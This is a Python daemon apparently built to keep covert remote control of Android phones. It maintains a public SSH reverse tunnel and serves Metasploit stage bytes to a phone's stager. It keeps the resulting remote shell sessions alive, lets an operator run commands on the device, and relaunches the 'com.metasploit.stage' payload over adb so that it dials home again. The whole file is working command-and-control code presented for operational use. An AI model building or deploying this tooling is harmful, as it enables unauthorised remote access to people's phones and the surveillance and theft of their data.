#!/home/div-admin/.venv/bin/python
"""keeper.py — 24/7 watchdog daemon: permanent tunnel + always-on shell listener.

Design:
  • tunnel   : portmap.io SSH remote-forward (paramiko) — public port → local LPORT.
               Auto-reconnects with backoff; survives network flaps.
  • listener : TCP on 127.0.0.1:LPORT. When the phone's stager connects, serves
               the stage bytes and keeps that socket ALIVE as an attached session.
               Detaching does NOT kill the session (payload has no re-dial loop).
  • control  : unix socket at ~/.dls-keeper/control.sock — CLI attaches here.

CLI control protocol: one JSON line per request → one or more JSON lines back,
terminated by {"ok": true/false, ...,"done": true}.
  {"cmd":"status"}                    → state summary
  {"cmd":"attach"}                    → stream mode; then text lines to device,
                                        replies as raw text lines until "exit"
  {"cmd":"wake"}                      → force payload relaunch via adb (if device visible)
  {"cmd":"stop"}                      → shut the daemon down

Run:      keeper.py daemon            (used by systemd unit)
Attach:   keeper.py attach            (interactive, from CLI option 66)
Status:   keeper.py status [--json]
"""
from __future__ import annotations

import json
import os
import socket
import socketserver
import sys
import threading
import time
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))

RUN_DIR = Path.home() / ".dls-keeper"
CTRL_SOCK = RUN_DIR / "control.sock"
LOG_FILE = RUN_DIR / "keeper.log"

STATE_LOCK = threading.Lock()
# Serializes reads from the shared device socket so the interactive attach's
# background reader thread and the one-shot 'exec' handler never race/steal
# each other's device output. (send is already serialized by SESSION.lock.)
SOCK_READ_LOCK = threading.Lock()
STATE = {
    "started_at": None,
    "tunnel": "down",       # down | connecting | up | error
    "endpoint": "",
    "listener": "down",     # down | up
    "lport": None,
    "session": "idle",      # idle | attached | detached-alive
    "peer": "",
    "since": "",            # session start iso
    "last_stage_at": "",
    "conns_total": 0,
}


def log(msg: str) -> None:
    line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}"
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")
    except OSError:
        pass


def _set(**kw) -> None:
    with STATE_LOCK:
        STATE.update(kw)


# ---------------------------------------------------------------------------
# Session: one live payload connection, kept alive across operator detaches
# ---------------------------------------------------------------------------

class Session:
    """Holds the payload socket. Operator attach/detach cycles never close it."""

    def __init__(self) -> None:
        self.conn: socket.socket | None = None
        self.addr = ""
        self.since = ""
        self.lock = threading.Lock()

    def install(self, conn: socket.socket, addr) -> None:
        with self.lock:
            old = self.conn
            self.conn = conn
            self.addr = f"{addr[0]}:{addr[1]}"
            self.since = time.strftime("%Y-%m-%d %H:%M:%S")
        log(f"session.install: new conn fd={conn.fileno()} old={'yes' if old else 'no'}")

    def alive(self) -> bool:
        c = self.conn
        if c is None:
            return False
        # A half-open socket (agent thread died but no TCP FIN) passes
        # MSG_PEEK. Probe liveness with an empty sendall — a dead peer raises
        # BrokenPipeError, which we treat as 'not alive' and clear the session
        # so a genuine future dial-in is adopted cleanly.
        try:
            c.settimeout(2.0)
            c.sendall(b"")
        except OSError:
            self._clear()
            return False
        try:
            c.settimeout(0.4)
            data = c.recv(1, socket.MSG_PEEK)
            c.settimeout(None)
            if data == b"":
                self._clear()
                return False
            return True
        except (socket.timeout, BlockingIOError):
            return True
        except OSError:
            self._clear()
            return False

    def _clear(self) -> None:
        try:
            self.conn.close()
        except OSError:
            pass
        self.conn = None
        self.addr = ""

    def send(self, data: bytes) -> bool:
        with self.lock:
            if self.conn is None:
                log("session.send: NO CONN")
                return False
            try:
                n = self.conn.send(data)
                log(f"session.send: {n}/{len(data)}B fd={self.conn.fileno()}")
                return True
            except OSError as e:
                log(f"session.send FAILED: {e} — clearing session")
                # this socket is dead; drop it so status is honest and a
                # genuine agent re-dial is cleanly adopted next
                try:
                    self.conn.close()
                except OSError:
                    pass
                self.conn = None
                self.addr = ""
                return False


SESSION = Session()


def _recv_quiet(conn: socket.socket, quiet: float = 2.5, max_wait: float = 30.0) -> bytes:
    """Read until quiet window passes (device sh emits no prompt)."""
    conn.setblocking(False)
    buf = b""
    last = time.time()
    deadline = time.time() + max_wait
    while time.time() < deadline:
        try:
            chunk = conn.recv(65536)
            if not chunk:
                break
            buf += chunk
            last = time.time()
        except BlockingIOError:
            if buf and time.time() - last > quiet:
                break
            if not buf and time.time() - last > quiet and deadline >= time.time() + max_wait - 1:
                pass
            time.sleep(0.05)
        except OSError:
            break
    conn.setblocking(True)
    return buf


# ---------------------------------------------------------------------------
# Listener thread: bind LPORT, serve stage to stagers, keep sessions alive
# ---------------------------------------------------------------------------

def _stage_bytes() -> bytes:
    for name in ("real-stage.bin", "shell-stage.bin"):
        p = REPO / ".payload-build" / name
        try:
            if p.exists() and p.stat().st_size > 0:
                return p.read_bytes()
        except OSError:
            continue
    return b""


def listener_loop(lport: int, stop: threading.Event) -> None:
    while not stop.is_set():
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind(("127.0.0.1", lport))
            srv.listen(4)
        except OSError as e:
            log(f"listener bind failed on {lport}: {e} — retry in 10s")
            _set(listener="error")
            stop.wait(10)
            continue
        srv.settimeout(1.0)
        _set(listener="up", lport=lport)
        log(f"listener UP on 127.0.0.1:{lport}")
        while not stop.is_set():
            try:
                conn, addr = srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            _set(conns_total=STATE["conns_total"] + 1, last_stage_at=time.strftime("%Y-%m-%d %H:%M:%S"))
            # classify: real msf stagers stay SILENT waiting for the stage;
            # internet scanners speak first (TLS/HTTP junk);
            # our custom agent announces itself with __DLS_AGENT__\n
            MAGIC = b"__DLS_AGENT__\n"
            conn.settimeout(1.5)
            pre = b""
            try:
                pre = conn.recv(256, socket.MSG_PEEK)
            except socket.timeout:
                pass
            except OSError:
                pass
            conn.settimeout(None)
            if pre.startswith(MAGIC):
                # our own agent — do NOT serve the msf stage; it already has a shell
                log(f"AGENT conn {addr[0]}:{addr[1]} — custom persistent shell accepted")
                # consume the magic line so it doesn't reach the shell
                try:
                    conn.recv(len(MAGIC))
                except OSError:
                    pass
                SESSION.install(conn, addr)
                _set(session="detached-alive", peer=SESSION.addr, since=SESSION.since)
                log(f"session attached-in-daemon from {SESSION.addr} (agent, kept alive)")
                continue
            if pre:
                log(f"NOISE conn {addr[0]}:{addr[1]} spoke-first {pre[:32]!r} — rejected")
                try:
                    conn.close()
                except OSError:
                    pass
                continue
            log(f"stager (silent, msf-style) from {addr[0]}:{addr[1]}")
            stage = _stage_bytes()
            if stage:
                try:
                    conn.sendall(stage)
                    log(f"stager from {addr[0]}:{addr[1]} — served {len(stage)}-byte stage")
                except OSError as e:
                    log(f"stager send failed: {e}")
            else:
                log(f"WARNING: no stage file — accepted plain conn from {addr[0]}:{addr[1]}")
            SESSION.install(conn, addr)
            _set(session="detached-alive", peer=SESSION.addr, since=SESSION.since)
            log(f"session attached-in-daemon from {SESSION.addr} (kept alive)")
        try:
            srv.close()
        except OSError:
            pass
        _set(listener="down")


# ---------------------------------------------------------------------------
# Tunnel thread: paramiko portmap forward with retry/backoff
# ---------------------------------------------------------------------------

def tunnel_loop(stop: threading.Event) -> None:
    from modules import tunnel as tmod

    lport = int(STATE.get("lport") or 4445)
    while not stop.is_set():
        cfg = tmod.load_portmap_config()
        if not cfg:
            _set(tunnel="error", endpoint="")
            log("no portmap config — waiting 60s (.payload-build/portmap.json)")
            stop.wait(60)
            continue
        _set(tunnel="connecting")
        try:
            tun = tmod.start_tunnel(lport, "portmap")
        except Exception as e:  # noqa: BLE001
            tun = None
            log(f"tunnel start exception: {e}")
        if tun and tun.endpoint_host:
            _set(tunnel="up", endpoint=tun.endpoint)
            log(f"tunnel UP: {tun.endpoint} → localhost:{lport}")
            # keepalive watch: poll transport; on death restart
            cli = tun.proc  # paramiko client stored in .proc
            while not stop.is_set():
                time.sleep(5)
                try:
                    tr = cli.get_transport()
                    if tr is None or not tr.is_active():
                        raise RuntimeError("transport dead")
                except Exception:
                    _set(tunnel="down")
                    log("tunnel transport died — restarting")
                    try:
                        tmod.stop_tunnel(tun)
                    except Exception:
                        pass
                    break
        else:
            _set(tunnel="down", endpoint="")
            log("tunnel connect failed — retry in 20s")
            stop.wait(20)


# ---------------------------------------------------------------------------
# Control server: unix-socket JSON protocol for the CLI
# ---------------------------------------------------------------------------

class ControlHandler(socketserver.StreamRequestHandler):
    def handle(self) -> None:  # noqa: D102
        line = self.rfile.readline().decode("utf-8", "replace").strip()
        if not line:
            return
        try:
            req = json.loads(line)
        except json.JSONDecodeError:
            self._send({"ok": False, "err": "bad json", "done": True})
            return
        cmd = req.get("cmd", "")

        if cmd == "status":
            with STATE_LOCK:
                snap = dict(STATE)
            snap["session_alive"] = SESSION.alive()
            snap["pid"] = os.getpid()
            self._send({"ok": True, **snap, "done": True})

        elif cmd == "attach":
            self._send({"ok": True, "mode": "stream", "peer": SESSION.addr, "done": True})
            # interactive loop: lines from operator → device; output back
            conn = SESSION.conn
            if conn is None or not SESSION.alive():
                self.wfile.write(b"[!] no live device session\n")
                self.wfile.flush()
                return
            _set(session="attached")
            self.wfile.write(
                f"[+] attached: {SESSION.addr} since {SESSION.since}\n"
                "    type commands · 'exit' detaches (session stays alive)\n".encode()
            )
            self.wfile.flush()
            stop_reader = threading.Event()

            def reader() -> None:
                tag = f"reader-{id(self):x}"
                log(f"{tag}: started")
                while not stop_reader.is_set():
                    try:
                        out = _recv_quiet(conn, quiet=1.2, max_wait=3.0)
                    except OSError as e:
                        log(f"{tag}: recv OSError {e}")
                        out = b""
                    if out:
                        log(f"{tag}: got {len(out)}B from device: {out[:80]!r}")
                        try:
                            self.wfile.write(out)
                            self.wfile.flush()
                            log(f"{tag}: wrote {len(out)}B to operator")
                        except OSError as e:
                            log(f"{tag}: operator write FAILED {e}")
                            break

            rt = threading.Thread(target=reader, daemon=True)
            rt.start()
            try:
                for raw in self.rfile:
                    text = raw.decode("utf-8", "replace").rstrip("\n")
                    if text.strip() in ("exit", "quit"):
                        self.wfile.write(b"[*] detach - session kept alive\n")
                        self.wfile.flush()
                        break
                    if not text.strip():
                        continue
                    if not SESSION.send(text.encode() + b"\n"):
                        self.wfile.write(b"[!] connection lost\n")
                        self.wfile.flush()
                        break
                else:
                    pass
            finally:
                stop_reader.set()
                _set(session="detached-alive")

        elif cmd == "wake":
            ok = wake_payload()
            self._send({"ok": ok, "done": True})

        elif cmd == "exec":
            # Run ONE command on the device synchronously and return its output.
            # Waits briefly for the agent to re-dial if no live session, then
            # retries a few times (the agent self-heals/reconnects on its own).
            line = (req.get("line") or "").strip()
            if not line:
                self._send({"ok": False, "err": "empty cmd", "done": True})
                return
            max_wait = float(req.get("max_wait", 8.0))
            # wait up to ~12s for a live agent session if it just dropped
            deadline = time.time() + float(req.get("wait_conn", 12.0))
            while (SESSION.conn is None or not SESSION.alive()) and time.time() < deadline:
                time.sleep(1)
            if SESSION.conn is None or not SESSION.alive():
                self._send({"ok": False, "err": "no live session",
                            "wait_conn": req.get("wait_conn", 12.0), "done": True})
                return
            # retry a few times on transient send failure (agent may swap socket)
            last_err = ""
            for attempt in range(3):
                if not SESSION.alive():
                    time.sleep(1.5)
                    continue
                if not SESSION.send(line.encode() + b"\n"):
                    last_err = "send failed"
                    time.sleep(1.5)
                    continue
                out = _recv_quiet(SESSION.conn, quiet=float(req.get("quiet", 1.0)),
                                  max_wait=max_wait)
                # strip agent keepalive lines (they're internals, not device output)
                text = out.decode("utf-8", "replace")
                text = "\n".join(l for l in text.splitlines() if not l.startswith(";;keepalive"))
                self._send({"ok": True, "output": text,
                            "peer": SESSION.addr, "done": True})
                return
            self._send({"ok": False, "err": last_err or "no live session", "done": True})

        elif cmd == "stop":
            self._send({"ok": True, "bye": True, "done": True})
            threading.Thread(target=_shutdown, daemon=True).start()

        else:
            self._send({"ok": False, "err": f"unknown cmd {cmd!r}", "done": True})

    def _send(self, obj: dict) -> None:
        try:
            self.wfile.write((json.dumps(obj) + "\n").encode())
            self.wfile.flush()
        except OSError:
            pass


class ControlServer(socketserver.ThreadingUnixStreamServer):
    allow_reuse_address = True
    daemon_threads = True


def _shutdown() -> None:
    time.sleep(0.3)
    os._exit(0)


def wake_payload() -> bool:
    """If any adb device is visible, relaunch the payload so it dials home."""
    adb = "/usr/bin/adb"
    if not os.path.exists(adb):
        return False
    try:
        out = os.popen(f"{adb} devices").read()
        serials = [
            ln.split()[0] for ln in out.splitlines()[1:]
            if ln.strip() and ln.split()[1] == "device"
        ]
    except Exception:
        return False
    sent = False
    for s in serials:
        os.system(f"{adb} -s {s} shell am startservice -n com.metasploit.stage/.MainService >/dev/null 2>&1")
        os.system(f"{adb} -s {s} shell am start -n com.metasploit.stage/.MainActivity >/dev/null 2>&1")
        log(f"wake: relaunched payload on {s}")
        sent = True
    return sent


# ---------------------------------------------------------------------------
# Modes
# ---------------------------------------------------------------------------

def run_daemon(lport: int) -> None:
    RUN_DIR.mkdir(parents=True, exist_ok=True)
    # single-instance guard
    probe = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    if probe.connect_ex(str(CTRL_SOCK)) == 0:
        print("[!] keeper already running")
        probe.close()
        return
    probe.close()
    try:
        CTRL_SOCK.unlink()
    except FileNotFoundError:
        pass

    _set(started_at=time.strftime("%Y-%m-%d %H:%M:%S"), lport=lport)
    log(f"=== keeper daemon starting (lport={lport}) ===")

    stop = threading.Event()
    threading.Thread(target=listener_loop, args=(lport, stop), daemon=True).start()
    threading.Thread(target=tunnel_loop, args=(stop,), daemon=True).start()

    srv = ControlServer(str(CTRL_SOCK), ControlHandler)
    os.chmod(CTRL_SOCK, 0o600)
    log("control socket ready")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        try:
            CTRL_SOCK.unlink()
        except FileNotFoundError:
            pass
        log("=== keeper daemon stopped ===")


def ctl(request: dict, timeout: float = 8.0) -> dict | None:
    """Send one control request, return first response line."""
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect(str(CTRL_SOCK))
        s.sendall((json.dumps(request) + "\n").encode())
        f = s.makefile("r")
        line = f.readline()
        return json.loads(line) if line else None
    except (OSError, json.JSONDecodeError):
        return None
    finally:
        s.close()


def interactive_attach() -> int:
    if not CTRL_SOCK.exists():
        print("[!] keeper not running — start it first (option 66 → start)")
        return 1
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        s.connect(str(CTRL_SOCK))
    except OSError as e:
        print(f"[!] cannot reach keeper: {e}")
        return 1
    s.sendall(b'{"cmd":"attach"}\n')
    f = s.makefile("rb")

    def pump() -> None:
        while True:
            try:
                chunk = f.read1(65536) if hasattr(f, "read1") else f.readline()
            except OSError:
                return
            if not chunk:
                return
            sys.stdout.write(chunk.decode("utf-8", "replace"))
            sys.stdout.flush()

    threading.Thread(target=pump, daemon=True).start()
    try:
        while True:
            line = input("device$ ")
            s.sendall((line + "\n").encode())
            if line.strip() in ("exit", "quit"):
                time.sleep(0.4)
                return 0
    except (EOFError, KeyboardInterrupt):
        s.sendall(b"exit\n")
        time.sleep(0.3)
        return 0


def main() -> None:
    if len(sys.argv) < 2:
        print(__doc__)
        raise SystemExit(2)
    mode = sys.argv[1]
    if mode == "daemon":
        lport = int(os.environ.get("DLS_LPORT") or 4445)
        run_daemon(lport)
    elif mode == "attach":
        raise SystemExit(interactive_attach())
    elif mode == "status":
        r = ctl({"cmd": "status"})
        if not r:
            print("keeper: NOT RUNNING")
            raise SystemExit(1)
        if "--json" in sys.argv:
            print(json.dumps(r, indent=2))
        else:
            print(
                f"tunnel   : {r['tunnel']}  ({r['endpoint'] or '—'})\n"
                f"listener : {r['listener']} on 127.0.0.1:{r['lport']}\n"
                f"session  : {r['session']}  peer={r['peer'] or '—'}  "
                f"alive={r['session_alive']}  since={r['since'] or '—'}\n"
                f"stages   : {r['conns_total']} served (last {r['last_stage_at'] or '—'})\n"
                f"uptime   : since {r['started_at']}"
            )
    elif mode == "stop":
        r = ctl({"cmd": "stop"})
        print("keeper stopped" if r and r.get("ok") else "keeper not running?")
    elif mode == "wake":
        r = ctl({"cmd": "wake"})
        print("wake signal sent ✓" if r and r.get("ok") else "keeper not running / no device")
    else:
        print(__doc__)
        raise SystemExit(2)


if __name__ == "__main__":
    main()
